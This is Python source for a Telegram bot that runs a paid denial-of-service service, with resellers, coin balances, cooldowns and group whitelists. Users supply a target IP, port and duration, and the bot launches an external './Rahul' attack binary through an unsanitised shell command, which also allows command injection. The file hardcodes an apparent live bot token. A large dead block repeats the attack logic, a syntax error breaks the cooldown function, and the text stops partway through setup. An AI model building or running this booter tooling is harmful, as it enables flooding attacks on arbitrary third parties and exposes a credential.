import os
import time
import logging
import asyncio
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
from telegram.helpers import escape_markdown

# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7589472756:AAHbNHmJvGG-tBZi2Zq_svsmCkaUpDSvBiU'  # Replace with your bot token
OWNER_USERNAME = "DEMON_PAPA1"  # Replace with your Telegram username (without @)
DEFAULT_GROUP_ID = -1002650037232  # Default group ID
max_duration = 240  # Default max attack duration

# Group Management
allowed_groups = {DEFAULT_GROUP_ID}  # Stores allowed group IDs

# Reseller System
resellers = set()  # Stores reseller user IDs
reseller_balances = {}  # Stores reseller balances (user_id: balance)

# Global Cooldown
global_cooldown = 0  # Global cooldown in seconds
last_attack_time = 0  # Timestamp of the last attack

# Track running attacks
running_attacks = {}

# Feedback System
feedback_waiting = {}  # Stores users waiting to give feedback
users_pending_feedback = set()  # Stores users who need to give feedback before next attack
user_feedback_history = {}  # Stores user's feedback history to detect duplicates
user_bans = {}  # Stores banned users and their ban expiration time
MAX_CONCURRENT_ATTACKS_PER_USER = 1  # Maximum attacks a user can run simultaneously

# Custom Keyboard for All Users in Group Chat
group_user_keyboard = [
    ['Start', 'Attack'],
    ['Rules', '🔍 Status', 'Feedback']
]
group_user_markup = ReplyKeyboardMarkup(group_user_keyboard, resize_keyboard=True)

# Custom Keyboard for Resellers in Private Chat
reseller_keyboard = [
    ['Start', 'Attack'],
    ['Rules', 'Balance']
]
reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)

# Custom Keyboard for Owner in Private Chat
owner_keyboard = [
    ['Start', 'Attack'],
    ['Rules', 'Set Duration', 'Set Threads'],
    ['Add Group', 'Remove Group', 'List Groups'],
    ['Add Reseller', 'Remove Reseller', 'Add Coin'],
    ['Set Cooldown']
]
owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)

# Conversation States
GET_ATTACK_ARGS = 1
GET_SET_DURATION = 2
GET_SET_THREADS = 3
GET_RESELLER_ID = 4
GET_REMOVE_RESELLER_ID = 5
GET_ADD_COIN_USER_ID = 6
GET_ADD_COIN_AMOUNT = 7
GET_SET_COOLDOWN = 8
GET_ADD_GROUP_ID = 9
GET_REMOVE_GROUP_ID = 10

# Dynamic Cooldown System
dynamic_cooldown_multiplier = 1.5  # Multiplier based on attack duration
MIN_COOLDOWN = 10  # Minimum cooldown in seconds
MAX_COOLDOWN = 600  # Maximum cooldown in seconds

# Check if bot is used in an allowed group
def is_allowed_group(update: Update):
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id in allowed_groups

# Check if the user is the owner
def is_owner(update: Update):
    return update.effective_user.username == OWNER_USERNAME

# Check if the user is a reseller
def is_reseller(update: Update):
    return update.effective_user.id in resellers

# Check if the user is authorized to use the bot in private chat
def is_authorized_user(update: Update):
    return is_owner(update) or is_reseller(update)

# Check if user is currently banned
def is_banned(user_id):
    if user_id in user_bans:
        if time.time() < user_bans[user_id]:
            return True
        else:
            del user_bans[user_id]
    return False

# Check how many attacks a user has running
def check_user_attacks(user_id):
    count = 0
    for attack in running_attacks.values():
        if attack['user_id'] == user_id:
            count += 1
    return count

# Calculate dynamic cooldown based on attack duration
def calculate_cooldown(duration):
    cooldown = min(max(int(duration * dynamic_cooldown_multiplier), MAX_COOLDOWN)
    return max(cooldown, MIN_COOLDOWN)

# Start Command
async def start(update: Update, context: CallbackContext):
    chat = update.effective_chat

    if chat.type == "private":
        if not is_authorized_user(update):
            await update.message.reply_text("❌ *This bot is not authorized to use here.*", parse_mode='Markdown')
            return

        message = (
            "*🔥 Welcome to the battlefield! 🔥*\n\n"
            "*Use Attack to start an attack!*\n\n"
            "*💥 Let the war begin!*"
        )

        if is_owner(update):
            await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=owner_markup)
        else:
            await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=reseller_markup)
        return

    if not is_allowed_group(update):
        return

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use Attack to start an attack!*\n\n"
        "*💥 Let the war begin!*"
    )

    await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=group_user_markup)

# Attack Command - Start Conversation
async def attack_start(update: Update, context: CallbackContext):
    chat = update.effective_chat

    if chat.type == "private":
        if not is_authorized_user(update):
            await update.message.reply_text("❌ *This bot is not authorized to use here.*", parse_mode='Markdown')
            return ConversationHandler.END

    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in allowed groups!*", parse_mode='Markdown')
        return ConversationHandler.END

    global last_attack_time, global_cooldown
    user_id = update.effective_user.id

    # Check if user is banned
    if is_banned(user_id):
        ban_time = user_bans[user_id] - time.time()
        await update.message.reply_text(
            f"❌ *You are banned from using the bot for {int(ban_time/60)} minutes due to spam feedback!*",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    current_time = time.time()
    if current_time - last_attack_time < global_cooldown:
        remaining_cooldown = int(global_cooldown - (current_time - last_attack_time))
        await update.message.reply_text(f"❌ *Please wait! Cooldown is active. Remaining: {remaining_cooldown} seconds.*", parse_mode='Markdown')
        return ConversationHandler.END

    if check_user_attacks(user_id) >= MAX_CONCURRENT_ATTACKS_PER_USER:
        await update.message.reply_text("❌ *You already have an attack running! Please wait for it to finish.*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the attack arguments: <ip> <port> <duration>*", parse_mode='Markdown')
    return GET_ATTACK_ARGS

async def attack_input(update: Update, context: CallbackContext):
    global last_attack_time, running_attacks, global_cooldown

    args = update.message.text.split()
    if len(args) != 3:
        await update.message.reply_text("❌ *Invalid input! Please enter <ip> <port> <duration>.*", parse_mode='Markdown')
        return ConversationHandler.END

    ip, port, duration = args
    try:
        duration = int(duration)
    except ValueError:
        await update.message.reply_text("❌ *Invalid duration! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END

    if duration > max_duration:
        await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
        return ConversationHandler.END

    # Calculate dynamic cooldown
    global_cooldown = calculate_cooldown(duration)
    last_attack_time = time.time()
    
    attack_id = f"{ip}:{port}-{time.time()}"
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    
    running_attacks[attack_id] = {
        'user_id': user_id,
        'user_name': user_name,
        'start_time': time.time(),
        'duration': duration,
        'target': f"{ip}:{port}",
        'message_id': None,
        'chat_id': update.effective_chat.id
    }

    # Send initial attack message
    message = await update.message.reply_text(
        f"⚔️ *Attack Started!*\n"
        f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
        f"🎯 *Target*: `{ip}:{port}`\n"
        f"🕒 *Duration*: {duration} sec\n"
        f"⏳ *Time Left*: {duration} sec\n"
        f"⏲️ *Cooldown Left*: {global_cooldown} sec\n"
        f"🔥 *Let the battlefield ignite! 💥*",
        parse_mode='Markdown'
    )
    
    running_attacks[attack_id]['message_id'] = message.message_id

    async def run_attack():
        start_time = time.time()
        end_time = start_time + duration
        cooldown_end = end_time + global_cooldown
        
        try:
            process = await asyncio.create_subprocess_shell(
                f"./Rahul {ip} {port} {duration}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # Update every second
            while time.time() < end_time:
                time_left = max(0, int(end_time - time.time()))
                elapsed = int(time.time() - start_time)
                current_cooldown = max(0, int(cooldown_end - time.time()))
                
                try:
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=message.message_id,
                        text=(
                            f"⚔️ *Attack In Progress!*\n"
                            f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
                            f"🎯 *Target*: `{ip}:{port}`\n"
                            f"🕒 *Duration*: {duration} sec\n"
                            f"⏳ *Time Left*: {time_left} sec\n"
                            f"⏱️ *Elapsed*: {elapsed} sec\n"
                            f"⏲️ *Cooldown Left*: {current_cooldown} sec\n"
                            f"🔥 *Attack is running...*"
                        ),
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logging.error(f"Error updating attack status: {str(e)}")
                
                await asyncio.sleep(1)

            stdout, stderr = await process.communicate()

            if attack_id in running_attacks:
                del running_attacks[attack_id]

            current_cooldown = max(0, int(cooldown_end - time.time()))
            
            if process.returncode == 0:
                if user_id not in feedback_waiting:
                    users_pending_feedback.add(user_id)
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=message.message_id,
                        text=(
                            f"✅ *Attack Finished!*\n"
                            f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
                            f"🎯 *Target*: `{ip}:{port}`\n"
                            f"🕒 *Duration*: {duration} sec\n"
                            f"⏲️ *Cooldown Left*: {current_cooldown} sec\n"
                            f"📢 *Please provide feedback using the Feedback button before launching another attack!*\n"
                            f"🔥 *The battlefield is now silent.*"
                        ),
                        parse_mode='Markdown'
                    )
                else:
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=message.message_id,
                        text=(
                            f"✅ *Attack Finished!*\n"
                            f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
                            f"🎯 *Target*: `{ip}:{port}`\n"
                            f"🕒 *Duration*: {duration} sec\n"
                            f"⏲️ *Cooldown Left*: {current_cooldown} sec\n"
                            f"🔥 *The battlefield is now silent.*"
                        ),
                        parse_mode='Markdown'
                    )
            else:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=message.message_id,
                    text=(
                        f"❌ *Attack Failed!*\n"
                        f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
                        f"🎯 *Target*: `{ip}:{port}`\n"
                        f"🕒 *Duration*: {duration} sec\n"
                        f"💥 *Error*: {stderr.decode().strip()}"
                    ),
                    parse_mode='Markdown'
                )
        except Exception as e:
            logging.error(f"Error in attack execution: {str(e)}")
            if attack_id in running_attacks:
                del running_attacks[attack_id]
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=message.message_id,
                text=(
                    f"❌ *Attack Error!*\n"
                    f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
                    f"🎯 *Target*: `{ip}:{port}`\n"
                    f"💥 *Error*: {str(e)}"
                ),
                parse_mode='Markdown'
            )

    asyncio.create_task(run_attack())
    return ConversationHandler.END

    # Calculate dynamic cooldown
    global_cooldown = calculate_cooldown(duration)
    last_attack_time = time.time()
    
    attack_id = f"{ip}:{port}-{time.time()}"
    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    
    running_attacks[attack_id] = {
        'user_id': user_id,
        'user_name': user_name,
        'start_time': time.time(),
        'duration': duration,
        'target': f"{ip}:{port}",
        'message_id': None,  # Will store the status message ID
        'chat_id': update.effective_chat.id  # Store chat ID for updates
    }

    # Send initial attack message
    message = await update.message.reply_text(
        f"⚔️ *Attack Started!*\n"
        f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
        f"🎯 *Target*: `{ip}:{port}`\n"
        f"🕒 *Duration*: {duration} sec\n"
        f"⏳ *Time Left*: {duration} sec\n"
        f"🔃 *Cooldown*: {global_cooldown} sec\n"
        f"🔥 *Let the battlefield ignite! 💥*",
        parse_mode='Markdown'
    )
    
    # Store message ID for updates
    running_attacks[attack_id]['message_id'] = message.message_id

    async def run_attack():
        start_time = time.time()
        end_time = start_time + duration
        
        try:
            process = await asyncio.create_subprocess_shell(
                f"./Rahul {ip} {port} {duration}",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # Update timer every 5 seconds
            while time.time() < end_time:
                time_left = max(0, int(end_time - time.time()))
                elapsed = int(time.time() - start_time)
                
                # Update status message
                try:
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=message.message_id,
                        text=(
                            f"⚔️ *Attack In Progress!*\n"
                            f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
                            f"🎯 *Target*: `{ip}:{port}`\n"
                            f"🕒 *Duration*: {duration} sec\n"
                            f"⏳ *Time Left*: {time_left} sec\n"
                            f"⏱️ *Elapsed*: {elapsed} sec\n"
                            f"🔃 *Cooldown*: {global_cooldown} sec\n"
                            f"🔥 *Attack is running...*"
                        ),
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logging.error(f"Error updating attack status: {str(e)}")
                
                await asyncio.sleep(5)

            stdout, stderr = await process.communicate()

            if attack_id in running_attacks:
                del running_attacks[attack_id]

            if process.returncode == 0:
                # Only ask for feedback if user hasn't already given it during the attack
                if user_id not in feedback_waiting:
                    users_pending_feedback.add(user_id)
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=message.message_id,
                        text=(
                            f"✅ *Attack Finished!*\n"
                            f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
                            f"🎯 *Target*: `{ip}:{port}`\n"
                            f"🕒 *Duration*: {duration} sec\n"
                            f"🔃 *Cooldown*: {global_cooldown} sec\n"
                            f"📢 *Please provide feedback using the Feedback button before launching another attack!*\n"
                            f"🔥 *The battlefield is now silent.*"
                        ),
                        parse_mode='Markdown'
                    )
                else:
                    # User already gave feedback during attack
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=message.message_id,
                        text=(
                            f"✅ *Attack Finished!*\n"
                            f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
                            f"🎯 *Target*: `{ip}:{port}`\n"
                            f"🕒 *Duration*: {duration} sec\n"
                            f"🔃 *Cooldown*: {global_cooldown} sec\n"
                            f"🔥 *The battlefield is now silent.*"
                        ),
                        parse_mode='Markdown'
                    )
            else:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=message.message_id,
                    text=(
                        f"❌ *Attack Failed!*\n"
                        f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
                        f"🎯 *Target*: `{ip}:{port}`\n"
                        f"🕒 *Duration*: {duration} sec\n"
                        f"💥 *Error*: {stderr.decode().strip()}"
                    ),
                    parse_mode='Markdown'
                )
        except Exception as e:
            logging.error(f"Error in attack execution: {str(e)}")
            if attack_id in running_attacks:
                del running_attacks[attack_id]
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=message.message_id,
                text=(
                    f"❌ *Attack Error!*\n"
                    f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
                    f"🎯 *Target*: `{ip}:{port}`\n"
                    f"💥 *Error*: {str(e)}"
                ),
                parse_mode='Markdown'
            )

    asyncio.create_task(run_attack())

    return ConversationHandler.END

# Feedback Command
async def feedback(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in allowed groups!*", parse_mode='Markdown')
        return
    
    user_id = update.effective_user.id
    
    # Skip feedback for owner and resellers
    if is_owner(update) or is_reseller(update):
        await update.message.reply_text("ℹ️ *Owners and resellers don't need to provide feedback.*", parse_mode='Markdown')
        if user_id in users_pending_feedback:
            users_pending_feedback.remove(user_id)
        return
    
    feedback_waiting[user_id] = True
    await update.message.reply_text(
        "📢 *Please send your feedback as a text message or photo.*\n\n"
        "⚠️ *Note:* Any abusive feedback will result in a ban.\n"
        "⚠️ *Warning:* Sending the same feedback multiple times will result in a 10-minute ban!",
        parse_mode='Markdown'
    )

# Handle Photo Feedback
async def handle_photo(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    # Skip feedback processing for owner and resellers
    if is_owner(update) or is_reseller(update):
        return
    
    if user_id in feedback_waiting:
        # Record feedback time but don't store photo content
        user_feedback_history[user_id] = {
            'time': time.time(),
            'content': 'photo'  # We don't compare photos for duplicates
        }
        del feedback_waiting[user_id]
    if user_id in users_pending_feedback:
        users_pending_feedback.remove(user_id)
    await update.message.reply_text("✅ *Thanks for your feedback! You can now launch another attack.*", parse_mode='Markdown')

# Handle Text Feedback
async def handle_text_feedback(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat = update.effective_chat
    
    # Skip feedback processing for owner and resellers
    if is_owner(update) or is_reseller(update):
        return
    
    if user_id in feedback_waiting:
        feedback_text = update.message.text
        
        # Check for duplicate feedback
        if user_id in user_feedback_history:
            prev_feedback = user_feedback_history[user_id]
            if (feedback_text == prev_feedback['content'] and 
                time.time() - prev_feedback['time'] < 86400):  # 24 hour window
                # Ban user for 10 minutes
                user_bans[user_id] = time.time() + 600  # 10 minutes
                await update.message.reply_text(
                    "❌ *You have been banned for 10 minutes for sending duplicate feedback!*",
                    parse_mode='Markdown'
                )
                return
        
        # Store feedback
        user_feedback_history[user_id] = {
            'time': time.time(),
            'content': feedback_text
        }
        
        del feedback_waiting[user_id]
        if user_id in users_pending_feedback:
            users_pending_feedback.remove(user_id)
        await update.message.reply_text("✅ *Thanks for your feedback! You can now launch another attack.*", parse_mode='Markdown')
    else:
        # If not in feedback mode, let the button handler deal with it
        await handle_button_click(update, context)

# Set Cooldown Command - Start Conversation
async def set_cooldown_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can set cooldown!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the global cooldown duration in seconds.*", parse_mode='Markdown')
    return GET_SET_COOLDOWN

# Set Cooldown Command - Handle Cooldown Input
async def set_cooldown_input(update: Update, context: CallbackContext):
    global global_cooldown

    try:
        global_cooldown = int(update.message.text)
        await update.message.reply_text(f"✅ *Global cooldown set to {global_cooldown} seconds!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Set Duration Command - Start Conversation
async def set_duration_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can set max attack duration!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum attack duration in seconds.*", parse_mode='Markdown')
    return GET_SET_DURATION

# Set Duration Command - Handle Duration Input
async def set_duration_input(update: Update, context: CallbackContext):
    global max_duration
    try:
        max_duration = int(update.message.text)
        await update.message.reply_text(f"✅ *Maximum attack duration set to {max_duration} seconds!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Set Threads Command - Start Conversation
async def set_threads_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can set max threads!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum number of threads.*", parse_mode='Markdown')
    return GET_SET_THREADS

# Set Threads Command - Handle Threads Input
async def set_threads_input(update: Update, context: CallbackContext):
    global MAX_THREADS
    try:
        MAX_THREADS = int(update.message.text)
        await update.message.reply_text(f"✅ *Maximum threads set to {MAX_THREADS}!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Add Reseller Command - Start Conversation
async def add_reseller_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can add resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_RESELLER_ID

# Add Reseller Command - Handle User ID Input
async def add_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        resellers.add(user_id)
        reseller_balances[user_id] = 0
        await update.message.reply_text(f"✅ *Reseller with ID {user_id} added successfully!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Remove Reseller Command - Start Conversation
async def remove_reseller_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can remove resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller to remove.*", parse_mode='Markdown')
    return GET_REMOVE_RESELLER_ID

# Remove Reseller Command - Handle User ID Input
async def remove_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            resellers.remove(user_id)
            if user_id in reseller_balances:
                del reseller_balances[user_id]
            await update.message.reply_text(f"✅ *Reseller with ID {user_id} removed successfully!*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Add Coin Command - Start Conversation
async def add_coin_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can add coins!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_ADD_COIN_USER_ID

# Add Coin Command - Handle User ID Input
async def add_coin_user_id(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            context.user_data['add_coin_user_id'] = user_id
            await update.message.reply_text("⚠️ *Enter the amount of coins to add.*", parse_mode='Markdown')
            return GET_ADD_COIN_AMOUNT
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
            return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Add Coin Command - Handle Amount Input
async def add_coin_amount(update: Update, context: CallbackContext):
    amount_str = update.message.text

    try:
        amount = int(amount_str)
        user_id = context.user_data['add_coin_user_id']
        if user_id in reseller_balances:
            reseller_balances[user_id] += amount
            await update.message.reply_text(f"✅ *Added {amount} coins to reseller {user_id}. New balance: {reseller_balances[user_id]}*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid amount! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Balance Command
async def balance(update: Update, context: CallbackContext):
    if not is_reseller(update):
        await update.message.reply_text("❌ *Only resellers can check their balance!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    balance = reseller_balances.get(user_id, 0)
    await update.message.reply_text(f"💰 *Your current balance is: {balance} coins*", parse_mode='Markdown')

# Check Status Command
async def check_status(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in allowed groups!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    user_name = update.effective_user.full_name

    feedback_pending = user_id in users_pending_feedback
    banned = is_banned(user_id)

    # Check if user has any running attacks
    user_attacks = []
    for attack_id, attack in running_attacks.items():
        if attack['user_id'] == user_id:
            time_left = max(0, int((attack['start_time'] + attack['duration']) - time.time()))
            user_attacks.append({
                'target': attack['target'],
                'time_left': time_left,
                'duration': attack['duration']
            })

    status_message = (
        f"🔍 *User Status*\n\n"
        f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
        f"🆔 *ID:* `{user_id}`\n"
        f"📢 *Feedback Pending:* {'Yes' if feedback_pending else 'No'}\n"
        f"🚫 *Banned:* {'Yes' if banned else 'No'}\n"
        f"⚡ *Running Attacks:* {len(user_attacks)}/{MAX_CONCURRENT_ATTACKS_PER_USER}\n"
    )

    if user_attacks:
        status_message += "\n*Current Attacks:*\n"
        for attack in user_attacks:
            status_message += (
                f"🎯 *Target:* `{attack['target']}`\n"
                f"🕒 *Duration:* {attack['duration']} sec\n"
                f"⏳ *Time Left:* {attack['time_left']} sec\n\n"
            )

    status_message += "\n⚡ *You have access to use this bot in this group!*"

    await update.message.reply_text(status_message, parse_mode='Markdown')

# Add Group Command - Start Conversation
async def add_group_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can add groups!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the group ID to add.*", parse_mode='Markdown')
    return GET_ADD_GROUP_ID

# Add Group Command - Handle Group ID Input
async def add_group_input(update: Update, context: CallbackContext):
    group_id_str = update.message.text

    try:
        group_id = int(group_id_str)
        allowed_groups.add(group_id)
        await update.message.reply_text(f"✅ *Group with ID {group_id} added successfully!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid group ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# Remove Group Command - Start Conversation
async def remove_group_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can remove groups!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the group ID to remove.*", parse_mode='Markdown')
    return GET_REMOVE_GROUP_ID

# Remove Group Command - Handle Group ID Input
async def remove_group_input(update: Update, context: CallbackContext):
    group_id_str = update.message.text

    try:
        group_id = int(group_id_str)
        if group_id in allowed_groups:
            allowed_groups.remove(group_id)
            await update.message.reply_text(f"✅ *Group with ID {group_id} removed successfully!*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Group not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid group ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    return ConversationHandler.END

# List Groups Command
async def list_groups(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can list groups!*", parse_mode='Markdown')
        return

    if not allowed_groups:
        await update.message.reply_text("❌ *No groups are currently allowed.*", parse_mode='Markdown')
        return

    groups_list = "\n".join([f"• `{group_id}`" for group_id in allowed_groups])
    await update.message.reply_text(f"*Allowed Groups:*\n\n{groups_list}", parse_mode='Markdown')

# Cancel Current Conversation
async def cancel_conversation(update: Update, context: CallbackContext):
    await update.message.reply_text("❌ *Current process canceled.*", parse_mode='Markdown')
    return ConversationHandler.END

# Rules Command
async def rules(update: Update, context: CallbackContext):
    rules_text = (
        "📜 *Rules:*\n\n"
        "1. Do not spam the bot.\n\n"
        "2. Only use the bot in allowed groups.\n\n"
        "3. Follow the instructions carefully.\n\n"
        "4. Respect other users and the bot owner.\n\n"
        "5. You must provide feedback after each attack before launching another one.\n\n"
        "6. Sending the same feedback multiple times will result in a 10-minute ban.\n\n"
        "7. Any violation of these rules will result in a ban.\n\n\n"
        "BSDK RULES FOLLOW KRNA WARNA GND MAR DUNGA.\n\n"
    )
    await update.message.reply_text(rules_text, parse_mode='Markdown')

# Handle Button Clicks
async def handle_button_click(update: Update, context: CallbackContext):
    chat = update.effective_chat
    query = update.message.text

    if chat.type == "private" and not is_authorized_user(update):
        await update.message.reply_text("❌ *This bot is not authorized to use here.*", parse_mode='Markdown')
        return

    if query == 'Start':
        await start(update, context)
    elif query == 'Attack':
        await attack_start(update, context)
    elif query == 'Set Duration':
        await set_duration_start(update, context)
    elif query == 'Set Threads':
        await set_threads_start(update, context)
    elif query == 'Rules':
        await rules(update, context)
    elif query == 'Balance':
        await balance(update, context)
    elif query == 'Set Cooldown':
        await set_cooldown_start(update, context)
    elif query == '🔍 Status':
        await check_status(update, context)
    elif query == 'Add Group':
        await add_group_start(update, context)
    elif query == 'Remove Group':
        await remove_group_start(update, context)
    elif query == 'List Groups':
        await list_groups(update, context)
    elif query == 'Add Reseller':
        await add_reseller_start(update, context)
    elif query == 'Remove Reseller':
        await remove_reseller_start(update, context)
    elif query == 'Add Coin':
        await add_coin_start(update, context)
    elif query == 'Feedback':
        await feedback(update, context)

# Main Bot Setup
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Conversation Handlers
    attack_handler = ConversationHandler(
        entry_points=[CommandHandler("attack", attack_start), MessageHandler(filters.Text("Attack"), attack_start)],
        states={
            GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, attack_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_duration_handler = ConversationHandler(
        entry_points=[CommandHandler("setduration", set_duration_start), MessageHandler(filters.Text("Set Duration"), set_duration_start)],
        states={
            GET_SET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_duration_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_threads_handler = ConversationHandler(
        entry_points=[CommandHandler("set_threads", set_threads_start), MessageHandler(filters.Text("Set Threads"), set_threads_start)],
        states={
            GET_SET_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_threads_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_cooldown_handler = ConversationHandler(
        entry_points=[CommandHandler("setcooldown", set_cooldown_start), MessageHandler(filters.Text("Set Cooldown"), set_cooldown_start)],
        states={
            GET_SET_COOLDOWN: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_cooldown_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("addreseller", add_reseller_start), MessageHandler(filters.Text("Add Reseller"), add_reseller_start)],
        states={
            GET_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_reseller_input)],
